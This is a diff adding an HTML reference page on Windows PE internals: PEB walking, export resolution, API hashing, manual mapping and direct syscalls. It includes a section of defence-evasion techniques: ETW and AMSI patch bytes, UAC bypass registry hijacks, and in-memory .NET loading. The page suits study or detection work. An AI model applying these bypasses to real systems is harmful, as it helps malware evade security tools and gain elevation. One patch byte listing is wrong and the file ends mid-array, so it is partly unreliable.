@@ -1,0 +1,481 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>PE Parsing Reference</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#08090c;color:#e5e7eb;font-family:'Segoe UI',system-ui,sans-serif;min-height:100vh}
+.mono{font-family:'IBM Plex Mono','Consolas',monospace}
+.off{color:#ef4444;font-weight:600;font-size:.82em}
+.kw{color:#c084fc;font-weight:600;font-size:.82em}
+.hd{padding:10px 14px 0;border-bottom:1px solid #1a1d27;background:linear-gradient(180deg,#0c0e14,#08090c)}
+.hd h1{font-size:1em;font-weight:800;background:linear-gradient(135deg,#60a5fa,#a78bfa,#f87171);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
+.hd .sub{font-size:.62em;color:#374151}
+.at{display:flex;background:#111318;border-radius:6px;border:1px solid #1f2937;overflow:hidden}
+.ab{padding:4px 14px;border:none;cursor:pointer;font-size:.76em;font-weight:700;background:transparent;color:#4b5563;font-family:'IBM Plex Mono',monospace}
+.ab.on{background:#3b82f6;color:#fff}
+.st{display:flex;gap:1px;overflow-x:auto;flex-wrap:wrap}
+.sb{padding:4px 7px;border:none;cursor:pointer;border-radius:6px 6px 0 0;font-size:.66em;font-weight:600;white-space:nowrap;background:transparent;color:#374151;border-bottom:2px solid transparent;transition:all .15s}
+.sb[data-sc="kit"],.sb[data-sc="byp"]{border-left:2px solid #ffffff15;margin-left:4px}
+.sb.on{background:#111318}
+.ut{padding:0 14px;background:#0a0b10;border-bottom:1px solid #1a1d27;display:flex}
+.ub{padding:7px 12px;border:none;cursor:pointer;font-size:.7em;font-weight:600;background:transparent;color:#4b5563;border-bottom:2px solid transparent;display:flex;align-items:center;gap:4px}
+.ub.on{color:#e5e7eb;border-bottom-color:#e5e7eb}
+.cnt{font-size:.82em;background:#1f2937;padding:0 4px;border-radius:6px;color:#9ca3af}
+.ct{padding:10px 14px;overflow-x:auto}
+.fr{display:flex;align-items:flex-start;gap:0;overflow-x:auto;padding:8px 0}
+.ar{display:flex;align-items:center;padding:0 4px;flex-shrink:0}
+.ar .ln{width:24px;height:2px;background:linear-gradient(90deg,#4b5563,#9ca3af)}
+.ar .tp{color:#9ca3af;font-size:13px;margin-left:-2px}
+.ar .lb{font-size:.62em;color:#6b7280;margin-left:3px;white-space:nowrap}
+.bx{background:#0d0f14;border-radius:8px;flex-shrink:0;overflow:hidden}
+.bx-h{padding:6px 10px;font-weight:700;font-size:.8em}
+.bx-s{font-size:.65em;color:#4b5563;margin-top:1px}
+.bx-b{padding:6px 10px}
+.fd{display:flex;gap:6px;padding:1.5px 0;font-size:.78em;align-items:baseline}
+.fd.hl{background:#ffffff06;border-radius:2px}
+.fd .tp{color:#6b7280;font-size:.82em}
+.tg{display:inline-block;padding:1px 7px;border-radius:4px;font-size:.78em;font-weight:700}
+.tg-s{padding:0 5px;font-size:.68em}
+.dm{padding:8px 14px;border-radius:8px;text-align:center;min-width:110px;flex-shrink:0}
+.nt{margin:6px 0;padding:7px 10px;border-radius:6px}
+.nt .nl{font-size:.6em;font-weight:800;letter-spacing:.08em;margin-bottom:2px}
+.nt .nb{color:#d1d5db;font-size:.78em;line-height:1.4}
+.cp{border:1px solid #1f2937;border-radius:8px;overflow:hidden;margin-bottom:6px}
+.ct2{width:100%;padding:8px 12px;border:none;cursor:pointer;text-align:left;background:#0d0f14;display:flex;align-items:center;gap:8px}
+.ct2:hover{background:#111827}
+.cv{color:#6b7280;font-size:12px;transition:transform .15s;display:inline-block}
+.cv.op{transform:rotate(90deg)}
+.ct2 .tl{color:#e5e7eb;font-size:.8em;font-weight:600;flex:1}
+.cb{margin:0;padding:10px 14px;background:#080a0f;font-size:.74em;line-height:1.5;color:#a5f3fc;overflow-x:auto;border-top:1px solid #1f2937;white-space:pre;tab-size:4}
+.cb .cm{color:#4b5563}
+.cb .pp{color:#f59e0b}
+.ti{border-radius:6px;overflow:hidden;border:1px solid #1f2937;background:#0a0c10;margin-bottom:3px}
+.ti.op{border-color:#f9731640;background:#f9731608}
+.tt{width:100%;padding:6px 10px;border:none;cursor:pointer;text-align:left;background:transparent;display:flex;align-items:center;gap:6px}
+.tt .tn{font-size:.78em;font-weight:600;color:#9ca3af}
+.ti.op .tn{color:#fdba74}
+.td{padding:4px 10px 8px 26px;color:#d1d5db;font-size:.76em;line-height:1.5}
+.sr{display:flex;gap:3px;overflow-x:auto;padding:8px 0;align-items:center}
+.sn{padding:5px 8px;border-radius:6px;cursor:pointer;text-align:center;min-width:72px;border:1.5px solid #1a1d27}
+.sn.on{background:color-mix(in srgb,currentColor 10%,transparent)}
+.sd{padding:8px 12px;border-radius:8px;background:#0d0f14;margin-top:4px}
+.fc{display:flex;flex-direction:column;gap:6px}
+.fw{display:flex;gap:8px;flex-wrap:wrap}
+.hd2{display:none}
+.nb2{padding:2px 6px;border:1px solid #1f2937;border-radius:4px;cursor:pointer;background:#0d0f14;color:#4b5563;font-size:.65em}
+.ft{padding:8px 14px;border-top:1px solid #1a1d27;display:flex;gap:8px;flex-wrap:wrap;font-size:.6em}
+.dt{width:6px;height:6px;border-radius:2px;display:inline-block}
+</style>
+</head>
+<body>
+<div id="app"></div>
+<script>
+const $=s=>document.querySelector(s);
+const $$=s=>[...document.querySelectorAll(s)];
+function esc(s){return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;')}
+
+const AD={
+x64:{seg:"GS:[0x30]",pldr:"+0x18",ll:"+0x10",lm:"+0x20",li:"+0x30",
+ef:[{o:"+0x20",n:"InMemoryOrderLinks",t:"LIST_ENTRY"},{o:"+0x30",n:"DllBase",t:"PVOID (8B)",h:1},{o:"+0x38",n:"EntryPoint",t:"PVOID"},{o:"+0x40",n:"SizeOfImage",t:"ULONG"},{o:"+0x48",n:"FullDllName",t:"UNICODE_STRING"},{o:"+0x58",n:"BaseDllName",t:"UNICODE_STRING",h:1}],
+nt:"IMAGE_NT_HEADERS64",oh:"IMAGE_OPTIONAL_HEADER64",mg:"0x20B (PE32+)",mc:"0x8664 (AMD64)",
+ib:"ULONGLONG (8B)",dd:"+0x70",ob:"0x8000000000000000",om:"IMAGE_ORDINAL_FLAG64",
+tn:"IMAGE_THUNK_DATA64",ts:"QWORD (8B)",ic:"ULONGLONG",
+rp:{t:"Type 10",n:"DIR64",op:"*(ULONGLONG*)addr += delta",nt:"Primary x64"},
+rs:{t:"Type 3",n:"HIGHLOW",op:"*(DWORD*)addr += (DWORD)delta"},
+sc:["mov  r10, rcx    ; syscall convention","mov  eax, SSN    ; service number","syscall           ; kernel transition","ret"],
+sn:"x64 uses syscall instruction",
+pa:"; x64\nmov rax, gs:[0x30] ; TEB\nmov rax, [rax+0x60] ; PEB",pc:"0x60"},
+x86:{seg:"FS:[0x30]",pldr:"+0x0C",ll:"+0x0C",lm:"+0x14",li:"+0x1C",
+ef:[{o:"+0x10",n:"InMemoryOrderLinks",t:"LIST_ENTRY"},{o:"+0x18",n:"DllBase",t:"PVOID (4B)",h:1},{o:"+0x1C",n:"EntryPoint",t:"PVOID"},{o:"+0x20",n:"SizeOfImage",t:"ULONG"},{o:"+0x24",n:"FullDllName",t:"UNICODE_STRING"},{o:"+0x2C",n:"BaseDllName",t:"UNICODE_STRING",h:1}],
+nt:"IMAGE_NT_HEADERS32",oh:"IMAGE_OPTIONAL_HEADER32",mg:"0x10B (PE32)",mc:"0x014C (i386)",
+ib:"DWORD (4B)",dd:"+0x60",ob:"0x80000000",om:"IMAGE_ORDINAL_FLAG32",
+tn:"IMAGE_THUNK_DATA32",ts:"DWORD (4B)",ic:"DWORD",
+rp:{t:"Type 3",n:"HIGHLOW",op:"*(DWORD*)addr += delta",nt:"Primary x86"},
+rs:null,
+sc:["mov  eax, SSN         ; service number","mov  edx, 0x7FFE0300  ; SharedUserData->SystemCall","call [edx]            ; KiFastSystemCall","ret  N                ; stdcall cleanup","","; Alt (legacy/WoW64):","mov  eax, SSN","int  0x2E             ; interrupt gate","ret  N"],
+sn:"x86 uses sysenter or int 0x2E",
+pa:"; x86\nmov eax, fs:[0x30] ; TEB->PEB",pc:"0x30"}
+};
+
+const SE=[
+{id:"peb",l:"A. PEB Walk",i:"\u{1F517}",c:"#60a5fa"},
+{id:"pe",l:"B. Headers",i:"\u{1F4CB}",c:"#4ade80"},
+{id:"exp",l:"C. Exports",i:"\u{1F4E4}",c:"#f59e0b"},
+{id:"hash",l:"D. Hashing",i:"#\uFE0F\u20E3",c:"#a78bfa"},
+{id:"imp",l:"E. IAT",i:"\u{1F4E5}",c:"#f87171"},
+{id:"rel",l:"F. Relocs",i:"\u{1F527}",c:"#eab308"},
+{id:"map",l:"G. Mapping",i:"\u{1F5FA}\uFE0F",c:"#6b7280"},
+{id:"sys",l:"H. Syscalls",i:"\u26A1",c:"#34d399"},
+{id:"kit",l:"I. Toolkit",i:"\u{1F9F0}",c:"#f472b6"},
+{id:"byp",l:"J. Bypasses",i:"\u{1F6E1}\uFE0F",c:"#fb923c"}];
+
+const HA=[{n:"ror13",f:"ROR(hash,13)+c"},{n:"djb2",f:"hash*33+c"},{n:"crc32",f:"CRC table"},{n:"FNV-1a",f:"(hash^c)*PRIME"},{n:"sdbm",f:"c+(h<<6)+(h<<16)-h"}];
+const SM=[{n:"Clean ntdll from disk",d:"Read ntdll.dll, parse exports, extract SSN from stub bytes"},{n:"Zw* export sorting",d:"Sort Zw* by addr - position = SSN"},{n:"Halo/Hell's Gate",d:"Read SSN from neighboring clean stubs"},{n:"Hardcoded per build",d:"Map build -> SSN table"}];
+
+function O(t){return '<span class="off mono">'+t+'</span>'}
+function K(t){return '<span class="kw mono">'+t+'</span>'}
+function T(t,c,s){return '<span class="tg'+(s?' tg-s':'')+'" style="background:'+c+'18;color:'+c+';border:1px solid '+c+'30">'+t+'</span>'}
+function A(l){return '<div class="ar"><div class="ln"></div><div class="tp">&#9658;</div>'+(l?'<div class="lb">'+l+'</div>':'')+'</div>'}
+function B(t,c,b,w,s){return '<div class="bx" style="min-width:'+(w||220)+'px;max-width:'+(w?w+100:330)+'px;border:1px solid '+c+'35"><div class="bx-h" style="color:'+c+';border-bottom:1px solid '+c+'20;background:linear-gradient(135deg,'+c+'12,'+c+'05)">'+t+(s?'<div class="bx-s">'+s+'</div>':'')+'</div><div class="bx-b">'+b+'</div></div>'}
+function F(o,n,t,hl){return '<div class="fd'+(hl?' hl':'')+'">'+O(o)+' <span style="flex:1">'+n+'</span>'+(t?'<span class="tp mono">'+t+'</span>':'')+'</div>'}
+function N(l,c,b){return '<div class="nt" style="background:'+c+'08;border:1px solid '+c+'25"><div class="nl" style="color:'+c+'">'+l+'</div><div class="nb">'+b+'</div></div>'}
+function D(l,s,c){return '<div class="dm" style="background:linear-gradient(135deg,'+c+'12,'+c+'06);border:1.5px solid '+c+'50"><div style="font-size:.72em;font-weight:700;color:'+c+'">'+l+'</div>'+(s?'<div style="font-size:.68em;color:#9ca3af;margin-top:2px" class="mono">'+s+'</div>':'')+'</div>'}
+
+// Flow renderers
+function fPEB(d){
+  var ef=d.ef.map(function(f){return F(f.o,f.n,f.t,f.h)}).join('');
+  return '<div class="fr">'+B("TEB","#60a5fa",F(d.seg,"\u2192 PEB*"),150)+A()+B("PEB","#60a5fa",F(d.pldr,"\u2192 Ldr*"),160)+A()+B("PEB_LDR_DATA","#60a5fa",F(d.ll,"InLoadOrderModuleList")+F(d.lm,"InMemoryOrderModuleList","",1)+F(d.li,"InInitOrderModuleList"),270)+A("walk list")+B("LDR_DATA_TABLE_ENTRY","#60a5fa",ef,290,"Doubly-linked list")+'</div><div class="fw">'+N("TRAVERSAL","#60a5fa","Walk "+K("Flink")+" until back to head. 1st=ntdll, 2nd=kernel32.")+N("MATCHING","#a78bfa","Compare "+K("BaseDllName")+" via hash (Sec D). String compare = OPSEC risk.")+'</div>';
+}
+
+function fPE(d){
+  return '<div class="fr">'+B("DOS_HEADER","#4ade80",F("+0x00","e_magic","0x5A4D")+F("+0x3C","e_lfanew","\u2192 NT",1),210,"At DllBase")+A("+ e_lfanew")+B(d.nt,"#4ade80",F("+0x00","Signature","0x4550")+F("+0x04","FileHeader")+F("+0x18","OptionalHeader","",1),230)+A()+'<div class="fc">'+B("FILE_HEADER","#4ade80",F("+0x00","Machine",d.mc)+F("+0x02","NumberOfSections","",1)+F("+0x10","SizeOfOptionalHeader"),250)+B(d.oh,"#4ade80",F("+0x00","Magic",d.mg)+F("+0x10","AddressOfEntryPoint","",1)+F("+0x18","ImageBase",d.ib,1)+F("+0x38","SizeOfImage")+F(d.dd,"DataDirectory[16]","",1),270)+'</div>'+A()+'<div class="fc">'+B("DataDirectory[]","#4ade80",F("[0]","Export Table","Sec C")+F("[1]","Import Table","Sec E")+F("[5]","Reloc Table","Sec F")+F("[9]","TLS Dir","Sec G"),220)+B("Section Headers[]","#4ade80",F("+0x0C","VirtualAddress","RVA",1)+F("+0x14","PointerToRawData","",1)+F("+0x24","Characteristics"),220)+'</div></div>'+N("RVA","#4ade80","<b>VA</b> = DllBase + RVA | <b>FileOff</b> = RVA \u2212 Sec.VA + Sec.PtrToRawData");
+}
+
+function fEXP(d){
+  return '<div class="fr">'+B("EXPORT_DIRECTORY","#f59e0b",F("+0x10","Base","ordinal base")+F("+0x14","NumberOfFunctions")+F("+0x18","NumberOfNames")+F("+0x1C","AddressOfFunctions","EAT",1)+F("+0x20","AddressOfNames","sorted",1)+F("+0x24","NameOrdinals","WORD[]",1),280,"DataDir[0].VA")+A()+'<div class="fc" style="gap:8px"><div class="fr" style="padding:0">'+T("NAME","#f59e0b")+A()+B("Search Names[]","#f59e0b",'<div style="font-size:.74em;color:#d1d5db">Binary search \u2192 idx <b>i</b></div>',170)+A()+B("Ordinal","#f59e0b",'<div style="font-size:.74em;color:#d1d5db">'+K("NameOrdinals[i]")+'</div>',170)+A()+B("Resolve","#f59e0b",'<div style="font-size:.74em;color:#d1d5db">VA = DllBase + '+K("EAT[ord]")+'</div>',200)+'</div><div class="fr" style="padding:0">'+T("ORD","#fb923c")+A()+B("Direct","#fb923c",'<div style="font-size:.74em;color:#d1d5db">idx = ord \u2212 Base \u2192 EAT[idx]</div>',200)+'</div></div></div>'+N("FORWARDER","#f59e0b","If funcRVA within export dir bounds \u2192 forwarder string \u2192 recursive resolve");
+}
+
+function fHASH(){
+  var al=HA.map(function(a){return '<div style="display:flex;gap:6px;padding:3px 7px;border-radius:4px;background:#a78bfa06;border:1px solid #a78bfa12;align-items:baseline"><span style="font-weight:700;color:#a78bfa;font-size:.74em;min-width:42px">'+a.n+'</span><code style="color:#d1d5db;font-size:.7em;flex:1" class="mono">'+a.f+'</code></div>'}).join('');
+  return '<div class="fr">'+B("1. Module Hash","#a78bfa",'<div style="font-size:.74em;color:#d1d5db;line-height:1.4">Walk PEB module list<br>Uppercase '+K("BaseDllName")+'<br>Hash \u2192 compare MODULE_HASH</div>',240)+A("found")+B("2. Function Hash","#a78bfa",'<div style="font-size:.74em;color:#d1d5db;line-height:1.4">Walk '+K("AddressOfNames[]")+'<br>Hash each (ASCII)<br>Compare FUNCTION_HASH</div>',240)+A("match")+B("3. Resolve","#a78bfa",'<div style="font-size:.74em;color:#d1d5db">'+K("EAT[ordinal]")+' \u2192 funcVA</div>',190)+A()+B("Composite","#a78bfa",'<div style="font-size:.74em;color:#d1d5db">'+K("HASH(mod)+HASH(func)")+'<br>Precompute at build time</div>',240)+'</div><div style="font-size:.66em;font-weight:700;color:#a78bfa;margin:4px 0 3px">ALGORITHM OPTIONS</div><div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:3px">'+al+'</div>';
+}
+
+function fIMP(d){
+  return '<div class="fr">'+B("IMPORT_DESCRIPTOR[]","#f87171",F("+0x00","OriginalFirstThunk","INT",1)+F("+0x0C","Name","DLL name")+F("+0x10","FirstThunk","IAT",1),240,"Null-terminated")+A("per DLL")+B("Walk INT/IAT","#f87171",'<div style="font-size:.72em;color:#d1d5db">'+d.tn+'<br>'+d.ts+'</div>',180)+A()+D("Ordinal bit?",d.ob,"#f59e0b")+A()+'<div class="fc"><div class="fr" style="padding:0">'+T("SET","#22c55e",1)+A()+B("Ordinal","#f87171",'<div style="font-size:.72em;color:#d1d5db">thunk &amp; 0xFFFF</div>',160)+'</div><div class="fr" style="padding:0">'+T("CLR","#ef4444",1)+A()+B("IMPORT_BY_NAME","#f87171",F("+0x00","Hint","WORD")+F("+0x02","Name","",1),170)+'</div></div>'+A("resolve")+B("Write IAT","#f87171",'<div style="font-size:.74em;color:#d1d5db">'+K("*("+d.ic+"*)IAT[i]")+' = VA</div>',190)+'</div>';
+}
+
+function fREL(d){
+  var ty='<div style="font-size:.74em"><div style="color:#6b7280"><b>Type 0</b> (ABS) \u2014 skip</div><div style="color:#fde047"><b>'+d.rp.t+'</b> ('+d.rp.n+'): <code>'+d.rp.op+'</code></div>'+(d.rs?'<div style="color:#9ca3af">'+d.rs.t+' ('+d.rs.n+')</div>':'')+'</div>';
+  return '<div class="fr">'+B("Calc Delta","#eab308",'<div style="font-size:.74em;color:#d1d5db">'+K("delta = Base \u2212 ImageBase")+'<br>If 0 \u2192 skip</div>',220)+A()+B("BASE_RELOCATION","#eab308",F("+0x00","VirtualAddress","page RVA",1)+F("+0x04","SizeOfBlock")+F("+0x08","TypeOffset[]","WORD[]",1),250,"Repeating blocks")+A("each")+B("Parse WORD","#eab308",'<div style="font-size:.74em;color:#d1d5db">Type = entry &gt;&gt; 12<br>Off = entry &amp; 0xFFF<br>addr = Base+PageRVA+Off</div>',220)+A("apply")+B("Types","#eab308",ty,260)+'</div>'+N("LOOP","#eab308","Advance by SizeOfBlock. Until VA==0 or past dir size.");
+}
+
+function fSYS(d){
+  var st=d.sc.map(function(l){if(!l)return'&nbsp;';var ci=l.indexOf(';');return ci>=0?esc(l.slice(0,ci))+'<span class="cm">'+esc(l.slice(ci))+'</span>':esc(l)}).join('\n');
+  var ss=SM.map(function(m,i){return'<div style="padding:2px 0;'+(i<3?'border-bottom:1px solid #1a1d27':'')+'"><div style="font-weight:700;color:#34d399;font-size:.72em">'+(i+1)+'. '+m.n+'</div><div style="color:#6b7280;font-size:.65em">'+m.d+'</div></div>'}).join('');
+  return '<div class="fr">'+B("Why Syscalls?","#34d399",'<div style="font-size:.74em;color:#d1d5db;line-height:1.4">EDR hooks ntdll at usermode. Direct syscalls bypass all usermode hooks.</div>',240)+A()+B("Stub","#34d399",'<pre class="mono" style="margin:0;font-size:.7em;color:#a5f3fc;line-height:1.35">'+st+'</pre><div style="font-size:.62em;color:#4b5563;margin-top:3px">'+d.sn+'</div>',310)+A("need SSN")+B("SSN Resolution","#34d399",ss,280)+'</div>';
+}
+
+
+function fBYP(d){
+  var h='<div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));gap:8px">';
+
+  // ETW card
+  h+='<div style="border-radius:8px;border:1px solid #fb923c25;background:#fb923c06;overflow:hidden">';
+  h+='<div style="padding:8px 10px;border-bottom:1px solid #fb923c15;font-weight:700;font-size:.76em;color:#fb923c">\u{1F50D} ETW (Event Tracing for Windows)</div>';
+  h+='<div style="padding:8px 10px;font-size:.72em;color:#d1d5db;line-height:1.5">';
+  h+='<div style="margin-bottom:6px">EDRs subscribe to <b style="color:#fb923c">EtwTi</b> (Threat Intelligence) provider via kernel callbacks. User-mode telemetry flows through <b style="color:#fb923c">ntdll!EtwEventWrite</b>.</div>';
+  h+='<div style="display:flex;flex-direction:column;gap:3px">';
+  h+=B("ntdll!EtwEventWrite","#fb923c","<div style=\"font-size:.74em;color:#d1d5db\">Usermode ETW entry point<br>Patch target: first bytes</div>",240);
+  h+='<div style="display:flex;align-items:center;gap:6px;padding-left:20px">';
+  h+='<span style="color:#34d399;font-size:.7em;font-weight:700">Patch \u2192</span>';
+  h+='<code class="mono" style="font-size:.68em;color:#a5f3fc">xor eax,eax; ret (C3 33 C0 C3) or ret 0 (48 33 C0 C3)</code>';
+  h+='</div>';
+  h+='<div style="display:flex;align-items:center;gap:6px;padding-left:20px;margin-top:2px">';
+  h+='<span style="color:#60a5fa;font-size:.7em;font-weight:700">Alt \u2192</span>';
+  h+='<code class="mono" style="font-size:.68em;color:#a5f3fc">Patch provider GUID to zero (no match, no events)</code>';
+  h+='</div></div></div></div>';
+
+  // AMSI card
+  h+='<div style="border-radius:8px;border:1px solid #fb923c25;background:#fb923c06;overflow:hidden">';
+  h+='<div style="padding:8px 10px;border-bottom:1px solid #fb923c15;font-weight:700;font-size:.76em;color:#fb923c">\u{1F6E1}\uFE0F AMSI (Antimalware Scan Interface)</div>';
+  h+='<div style="padding:8px 10px;font-size:.72em;color:#d1d5db;line-height:1.5">';
+  h+='<div style="margin-bottom:6px"><b style="color:#fb923c">amsi.dll</b> loaded into PowerShell, .NET, VBScript, JScript. Scan buffer sent to AV via <b style="color:#fb923c">AmsiScanBuffer</b>.</div>';
+  h+='<div style="display:flex;flex-direction:column;gap:3px">';
+  h+=B("amsi!AmsiScanBuffer","#fb923c","<div style=\"font-size:.74em;color:#d1d5db\">Buffer scan entry<br>Returns AMSI_RESULT</div>",240);
+  h+='<div style="display:flex;align-items:center;gap:6px;padding-left:20px">';
+  h+='<span style="color:#34d399;font-size:.7em;font-weight:700">Patch \u2192</span>';
+  h+='<code class="mono" style="font-size:.68em;color:#a5f3fc">Force E_INVALIDARG return (mov eax,0x80070057; ret)</code>';
+  h+='</div>';
+  h+='<div style="display:flex;align-items:center;gap:6px;padding-left:20px;margin-top:2px">';
+  h+='<span style="color:#60a5fa;font-size:.7em;font-weight:700">Alt \u2192</span>';
+  h+='<code class="mono" style="font-size:.68em;color:#a5f3fc">Patch AmsiOpenSession or amsiContext header</code>';
+  h+='</div></div></div></div>';
+
+  // UAC card
+  h+='<div style="border-radius:8px;border:1px solid #fb923c25;background:#fb923c06;overflow:hidden">';
+  h+='<div style="padding:8px 10px;border-bottom:1px solid #fb923c15;font-weight:700;font-size:.76em;color:#fb923c">\u{1F510} UAC (User Account Control)</div>';
+  h+='<div style="padding:8px 10px;font-size:.72em;color:#d1d5db;line-height:1.5">';
+  h+='<div style="margin-bottom:6px">Auto-elevate binaries trust specific conditions. Exploit <b style="color:#fb923c">DLL search order</b>, <b style="color:#fb923c">registry keys</b>, or <b style="color:#fb923c">COM object hijacking</b>.</div>';
+  h+='<div style="display:flex;flex-direction:column;gap:4px;font-size:.92em">';
+  var uac_methods=[
+    {n:"fodhelper.exe",d:"Registry: HKCU\\\\...\\\\ms-settings\\\\shell\\\\open\\\\command",c:"#34d399"},
+    {n:"computerdefaults.exe",d:"Same registry key, alternate binary",c:"#34d399"},
+    {n:"eventvwr.exe/mmc.exe",d:"Registry: mscfile\\\\shell\\\\open\\\\command",c:"#60a5fa"},
+    {n:"DLL sideloading",d:"Drop DLL in System32 trusted dir (mock dir)",c:"#eab308"},
+    {n:"CMSTP / wsreset.exe",d:"COM interface / store reset auto-elevate",c:"#a78bfa"},
+  ];
+  uac_methods.forEach(function(u){
+    h+='<div style="display:flex;gap:8px;align-items:baseline;padding:2px 0"><span style="font-weight:700;color:'+u.c+';min-width:140px">'+u.n+'</span><span style="color:#6b7280;font-size:.88em">'+u.d+'</span></div>';
+  });
+  h+='</div></div></div>';
+
+  // CLR / .NET card
+  h+='<div style="border-radius:8px;border:1px solid #fb923c25;background:#fb923c06;overflow:hidden">';
+  h+='<div style="padding:8px 10px;border-bottom:1px solid #fb923c15;font-weight:700;font-size:.76em;color:#fb923c">\u2699\uFE0F CLR / .NET Bypasses</div>';
+  h+='<div style="padding:8px 10px;font-size:.72em;color:#d1d5db;line-height:1.5">';
+  h+='<div style="margin-bottom:4px"><b style="color:#fb923c">clr.dll</b> hosts the .NET runtime. In-memory assembly loading via <b>Assembly.Load(byte[])</b> avoids disk.</div>';
+  h+='<div style="display:flex;flex-direction:column;gap:3px;font-size:.92em">';
+  h+='<div style="display:flex;gap:8px;align-items:baseline;padding:2px 0"><span style="font-weight:700;color:#34d399;min-width:140px">ETW CLR provider</span><span style="color:#6b7280">Patch clr!EventPipeEventProvider before Assembly.Load</span></div>';
+  h+='<div style="display:flex;gap:8px;align-items:baseline;padding:2px 0"><span style="font-weight:700;color:#60a5fa;min-width:140px">Module load callback</span><span style="color:#6b7280">EDRs monitor LdrRegisterDllNotification</span></div>';
+  h+='<div style="display:flex;gap:8px;align-items:baseline;padding:2px 0"><span style="font-weight:700;color:#eab308;min-width:140px">Inline .NET host</span><span style="color:#6b7280">ICLRRuntimeHost->ExecuteInDefaultAppDomain</span></div>';
+  h+='</div></div></div>';
+
+  h+='</div>';
+  return h;
+}
+
+function fKIT(d){
+  var shortcuts = '<div style="font-size:.72em;font-weight:800;color:#f472b6;letter-spacing:.06em;margin-bottom:6px">MODULE HANDLE SHORTCUTS</div>';
+  shortcuts += '<div class="fr">';
+  shortcuts += B("PEB","#f472b6",F(d.seg,"TEB \u2192 PEB"),140);
+  shortcuts += A();
+  shortcuts += B("Ldr","#f472b6",F(d.pldr,"\u2192 PEB_LDR_DATA"),160);
+  shortcuts += A();
+  shortcuts += B("InMemoryOrderModuleList","#f472b6",'<div style="font-size:.74em;color:#d1d5db;line-height:1.5">Flink[0] = <b>exe</b> (your process)<br>Flink[1] = <b style="color:#34d399">ntdll.dll</b> (always)<br>Flink[2] = <b style="color:#60a5fa">kernel32.dll</b> (always)</div><div style="font-size:.66em;color:#6b7280;margin-top:3px">Zero hash comparison needed for these three</div>',280);
+  shortcuts += A();
+  shortcuts += B("Direct PEB Fields","#f472b6",'<div style="font-size:.72em;color:#d1d5db;line-height:1.5">'+F("+0x02","BeingDebugged","BYTE")+F("+0x10","ImageBaseAddress","PVOID",1)+F("+0x20","ProcessParameters","RTL_USER_PROCESS_PARAMS*",1)+F("+0x30","ProcessHeap","PVOID")+F(d===AD.x64?"+0x68":"+0xBC","NtGlobalFlag","DWORD",1)+F(d===AD.x64?"+0xA4":"+0xA4","OSMajorVersion","DWORD")+'</div>',280,"No API calls needed");
+  shortcuts += '</div>';
+  
+  shortcuts += '<div style="margin-top:10px;font-size:.72em;font-weight:800;color:#f472b6;letter-spacing:.06em;margin-bottom:6px">PSEUDO-HANDLES \u0026 CONSTANTS</div>';
+  shortcuts += '<div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:4px">';
+  var consts = [
+    {n:"NtCurrentProcess()",v:"(HANDLE)-1",d:"Works with all Nt* APIs"},
+    {n:"NtCurrentThread()",v:"(HANDLE)-2",d:"No OpenThread needed"},
+    {n:"SharedUserData",v:"0x7FFE0000",d:"KUSER_SHARED_DATA, always mapped"},
+    {n:"TickCountLow",v:"USD+0x320",d:"GetTickCount without API"},
+    {n:"SystemTime",v:"USD+0x14",d:"100ns intervals since 1601"},
+  ];
+  consts.forEach(function(c){
+    shortcuts += '<div style="padding:5px 8px;border-radius:5px;background:#f472b608;border:1px solid #f472b615"><div style="display:flex;justify-content:space-between;align-items:baseline"><span style="font-weight:700;color:#f472b6;font-size:.76em">'+c.n+'</span><code class="mono" style="color:#a5f3fc;font-size:.72em">'+c.v+'</code></div><div style="font-size:.64em;color:#6b7280">'+c.d+'</div></div>';
+  });
+  shortcuts += '</div>';
+
+  shortcuts += '<div style="margin-top:10px;font-size:.72em;font-weight:800;color:#f472b6;letter-spacing:.06em;margin-bottom:6px">SECTION CHARACTERISTICS \u2192 MEMORY PROTECTION</div>';
+  shortcuts += '<div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:4px">';
+  var perms = [
+    {s:".text",f:"0x60000020",p:"PAGE_EXECUTE_READ",c:"#34d399"},
+    {s:".rdata",f:"0x40000040",p:"PAGE_READONLY",c:"#60a5fa"},
+    {s:".data",f:"0xC0000040",p:"PAGE_READWRITE",c:"#eab308"},
+    {s:".bss",f:"0xC0000080",p:"PAGE_READWRITE",c:"#eab308"},
+    {s:".reloc",f:"0x42000040",p:"PAGE_READONLY",c:"#60a5fa"},
+  ];
+  perms.forEach(function(p){
+    shortcuts += '<div style="padding:4px 8px;border-radius:5px;background:#0d0f14;border:1px solid '+p.c+'25"><div style="display:flex;gap:8px;align-items:baseline"><code class="mono" style="color:'+p.c+';font-size:.76em;font-weight:700">'+p.s+'</code><code class="mono" style="color:#6b7280;font-size:.68em">'+p.f+'</code></div><div style="font-size:.66em;color:#9ca3af">\u2192 '+p.p+'</div></div>';
+  });
+  shortcuts += '</div>';
+
+  return shortcuts;
+}
+
+var MS=[
+{n:1,l:"Read PE",s:"Parse hdrs",c:"#6b7280",d:"Parse DOS \u2192 NT \u2192 Optional \u2192 Sections. Validate MZ/PE signatures."},
+{n:2,l:"Allocate",s:"RW only!",c:"#ef4444",d:"VirtualAllocEx(SizeOfImage), PAGE_READWRITE. Never RWX. Randomize address."},
+{n:3,l:"Copy hdrs",s:"SizeOfHeaders",c:"#6b7280",d:"memcpy(base, raw, SizeOfHeaders)."},
+{n:4,l:"Sections",s:"\u2192 VirtualAddr",c:"#6b7280",d:"For each section: copy SizeOfRawData bytes to VirtualAddress."},
+{n:5,l:"Relocate",s:"Delta fixups",c:"#eab308",d:"delta = base \u2212 ImageBase. Apply fixups (Sec F)."},
+{n:6,l:"Imports",s:"IAT / hash",c:"#f87171",d:"Walk IMPORT_DESCRIPTOR (Sec E) or hashed resolution (Sec D)."},
+{n:7,l:"Perms",s:"Cycle R/RX/RW",c:"#ef4444",d:".text\u2192RX, .rdata\u2192R, .data\u2192RW. Never RWX."},
+{n:8,l:"TLS",s:"Callbacks",c:"#6b7280",d:"If DataDir[9] present, invoke TLS callback array."},
